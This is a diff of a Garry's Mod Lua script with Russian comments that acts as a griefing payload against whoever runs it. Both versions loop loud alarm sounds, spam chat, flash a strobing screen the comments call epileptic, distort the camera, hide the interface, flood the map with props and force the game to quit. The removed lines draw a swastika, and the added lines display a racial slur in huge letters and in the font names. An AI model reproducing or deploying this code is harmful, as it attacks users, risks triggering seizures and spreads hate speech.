@@ -1,4 +1,4 @@
-
+-- Мега громкие звуки
 local loudSounds = {
     "ambient/alarms/klaxon1.wav",
     "ambient/alarms/alarm_citizen_loop1.wav", 
@@ -12,165 +12,130 @@ local loudSounds = {
     "common/warning.wav"
 }
 
+-- Бесконечные звуки
+for i = 1, 20 do
+    timer.Simple(i * 0.1, function()
+        surface.PlaySound(loudSounds[math.random(1, #loudSounds)])
+    end)
+end
 
-local errorMessages = {
-    "ФАТАЛЬНАЯ ОШИБКА",
-    "СИСТЕМНЫЙ СБОЙ", 
-    "ТРЕВОГА",
-    "CRITICAL ERROR",
-    "SYSTEM FAILURE",
-    "ACCESS VIOLATION",
-    "MEMORY CORRUPTION",
-    "KERNEL PANIC",
-    "BLUE SCREEN",
-    "HARDWARE MALFUNCTION",
-    "卐",
-    "SWASTIKA",
-    "NAZI SYMBOL",
-    "HALT AND CATCH FIRE",
-    "STACK OVERFLOW",
-    "SEGMENTATION FAULT",
-    "CORRUPTED MEMORY",
-    "EXCEPTION 0xC0000005",
-    "PAGE FAULT",
-    "GENERAL PROTECTION FAULT"
-}
+-- Бешеный спам в чат
+timer.Create("ChatSpam", 0.05, 0, function()
+    RunConsoleCommand("say", "CRASH " .. math.random(1000, 9999))
+end)
 
+-- Ярко-красное небо
+hook.Add("Think", "BloodRedSky", function()
+    RunConsoleCommand("sv_skyname", "sky_borealis01")
+    RunConsoleCommand("sv_skyname", "sky_day01_01")
+end)
 
-surface.CreateFont("ChaosHuge", {
+-- Убираем руки
+hook.Add("PreDrawPlayerHands", "NoHands", function()
+    return true
+end)
+
+-- Бешеная камера
+hook.Add("CalcView", "CrazyCamera", function(ply, pos, angles, fov)
+    local view = {}
+    view.origin = pos + Vector(math.sin(CurTime() * 10) * 50, math.cos(CurTime() * 8) * 50, math.sin(CurTime() * 5) * 30)
+    view.angles = angles + Angle(math.sin(CurTime() * 5) * 30, math.cos(CurTime() * 7) * 40, math.sin(CurTime() * 3) * 20)
+    view.fov = fov + math.sin(CurTime() * 3) * 30
+    return view
+end)
+
+-- Радужный мир
+hook.Add("PreDrawEffects", "RainbowWorld", function()
+    render.SetColorModulation(math.sin(CurTime() * 2) * 0.5 + 0.5, math.cos(CurTime() * 3) * 0.5 + 0.5, math.sin(CurTime() * 4) * 0.5 + 0.5)
+end)
+
+-- Создаем огромные шрифты для надписей
+surface.CreateFont("NiggerHuge", {
+    font = "Arial",
+    size = 120,
+    weight = 2000,
+    antialias = false
+})
+
+surface.CreateFont("NiggerLarge", {
     font = "Arial",
     size = 80,
     weight = 2000,
     antialias = false
 })
 
-surface.CreateFont("ChaosLarge", {
-    font = "Arial",
-    size = 50, 
-    weight = 2000,
-    antialias = false
-})
-
-surface.CreateFont("ChaosMedium", {
-    font = "Arial",
-    size = 30,
-    weight = 2000, 
-    antialias = false
-})
-
-
-timer.Simple(0.1, function()
-    for i = 1, 20 do
-        timer.Simple(i * 0.05, function()
-            surface.PlaySound(loudSounds[math.random(1, #loudSounds)])
-        end)
-    end
-end)
-
-
-local chaosMessages = {}
-local chaosParticles = {}
-local startTime = CurTime()
-
-
-hook.Add("HUDPaint", "TotalChaosScreen", function()
-    local currentTime = CurTime()
-    local elapsed = currentTime - startTime
+-- Эпилептический экран с надписями NIGGER
+hook.Add("HUDPaint", "EpilepsyScreen", function()
+    local r = math.sin(CurTime() * 10) * 127 + 128
+    local g = math.sin(CurTime() * 10 + 2) * 127 + 128
+    local b = math.sin(CurTime() * 10 + 4) * 127 + 128
     
-
-    if math.sin(elapsed * 20) > 0 then
-        surface.SetDrawColor(255, 0, 0, 255)
-    else
-        surface.SetDrawColor(0, 0, 0, 255)
-    end
+    surface.SetDrawColor(r, g, b, 255)
     surface.DrawRect(0, 0, ScrW(), ScrH())
     
-
-    if math.random(1, 2) == 1 then
-        local fonts = {"ChaosHuge", "ChaosLarge", "ChaosMedium"}
-        table.insert(chaosMessages, {
-            text = errorMessages[math.random(1, #errorMessages)],
-            x = math.random(-100, ScrW() + 100),
-            y = math.random(-100, ScrH() + 100),
-            color = Color(math.random(150, 255), math.random(0, 100), math.random(0, 100)),
-            font = fonts[math.random(1, 3)],
-            speedX = math.random(-20, 20),
-            speedY = math.random(-20, 20),
-            angle = math.random(0, 360),
-            spin = math.random(-10, 10),
-            life = math.random(50, 200)
-        })
-    end
+    -- Три огромные надписи NIGGER
+    draw.SimpleText("NIGGER", "NiggerHuge", ScrW()/2, ScrH()/4, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+    draw.SimpleText("NIGGER", "NiggerLarge", ScrW()/4, ScrH()/2, Color(0, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+    draw.SimpleText("NIGGER", "NiggerLarge", ScrW()*3/4, ScrH()*3/4, Color(255, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
     
-    
-    for i, msg in ipairs(chaosMessages) do
-        draw.SimpleText(msg.text, msg.font, msg.x, msg.y, msg.color, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
-        
-        
-        msg.x = msg.x + msg.speedX
-        msg.y = msg.y + msg.speedY
-        msg.angle = msg.angle + msg.spin
-        msg.life = msg.life - 1
-        
-        
-        if msg.life <= 0 then
-            table.remove(chaosMessages, i)
-        end
-    end
-    
-
-    local swastikaSize = 200 + math.sin(elapsed * 5) * 50
-    local centerX, centerY = ScrW()/2, ScrH()/2
-    local swastikaAngle = elapsed * 100
-    
-    draw.SimpleText("卐", "ChaosHuge", centerX, centerY, Color(255, 255, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
-    
-
-    if math.random(1, 10) == 1 then
-        surface.SetDrawColor(255, 255, 255, math.random(50, 150))
-        surface.DrawRect(math.random(0, ScrW()), math.random(0, ScrH()), math.random(10, 100), math.random(10, 100))
-    end
+    -- Дополнительные летающие надписи
+    draw.SimpleText("РАДУГА", "DermaLarge", math.sin(CurTime() * 5) * ScrW()/2 + ScrW()/2, math.cos(CurTime() * 4) * ScrH()/2 + ScrH()/2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+    draw.SimpleText("ТРЕШ", "DermaLarge", math.cos(CurTime() * 3) * ScrW()/2 + ScrW()/2, math.sin(CurTime() * 2) * ScrH()/2 + ScrH()/2, Color(0, 0, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
 end)
 
+-- Убираем ВЕСЬ интерфейс
+hook.Add("HUDShouldDraw", "DestroyHUD", function()
+    return false
+end)
 
+-- Тряска игрока
+timer.Create("ShakePlayer", 0.1, 0, function()
+    LocalPlayer():SetPos(LocalPlayer():GetPos() + Vector(math.random(-10, 10), math.random(-10, 10), math.random(-5, 5)))
+end)
+
+-- Радужные эффекты пост-обработки
+hook.Add("RenderScreenspaceEffects", "RainbowEffects", function()
+    local tab = {}
+    tab[ "$pp_colour_addr" ] = math.sin(CurTime() * 3) * 0.3
+    tab[ "$pp_colour_addg" ] = math.cos(CurTime() * 4) * 0.3
+    tab[ "$pp_colour_addb" ] = math.sin(CurTime() * 5) * 0.3
+    tab[ "$pp_colour_brightness" ] = math.sin(CurTime() * 2) * 0.2
+    tab[ "$pp_colour_contrast" ] = 1 + math.sin(CurTime() * 6) * 0.5
+    tab[ "$pp_colour_colour" ] = 2 + math.cos(CurTime() * 7)
+    tab[ "$pp_colour_mulr" ] = 0
+    tab[ "$pp_colour_mulg" ] = 0
+    tab[ "$pp_colour_mulb" ] = 0
+    DrawColorModify(tab)
+    
+    DrawMotionBlur(0.2 + math.sin(CurTime() * 8) * 0.1, 1, 0)
+end)
+
+-- Создаем лаг через 5 секунд
 timer.Simple(5, function()
-
-    for i = 1, 10000 do
-        timer.Simple(i * 0.0001, function()
+    -- Спам объектами
+    for i = 1, 1000 do
+        timer.Simple(i * 0.001, function()
             local ent = ents.Create("prop_physics")
             if IsValid(ent) then
                 ent:SetModel("models/props_junk/TrashDumpster02.mdl")
-                ent:SetPos(Vector(math.random(-10000, 10000), math.random(-10000, 10000), math.random(0, 10000)))
+                ent:SetPos(Vector(math.random(-5000, 5000), math.random(-5000, 5000), math.random(0, 5000)))
                 ent:Spawn()
             end
         end)
     end
     
-
-    for i = 1, 1000 do
-        timer.Simple(i * 0.001, function()
-            RunConsoleCommand("say", "CRASH_" .. i)
-            LocalPlayer():SetPos(Vector(math.random(-10000, 10000), math.random(-10000, 10000), math.random(0, 10000)))
-        end)
-    end
-    
-
+    -- Принудительное закрытие
     timer.Simple(3, function()
-        for i = 1, 100 do
-            LocalPlayer():ConCommand("quit")
+        for i = 1, 50 do
+            RunConsoleCommand("quit")
             RunConsoleCommand("exit")
         end
     end)
 end)
 
-
-hook.Add("HUDShouldDraw", "HideEverything", function()
-    return false
-end)
-
-
-timer.Create("ChaosSounds", 0.2, 0, function()
+-- Дополнительные звуки
+timer.Create("MoreSounds", 0.2, 0, function()
     surface.PlaySound(loudSounds[math.random(1, #loudSounds)])
 end)
 
-print("[TOTAL CHAOS] ACTIVATED - COMPLETE DESTRUCTION IN 5 SECONDS!")
+print("ULTIMATE NIGGER CHAOS ACTIVATED!")
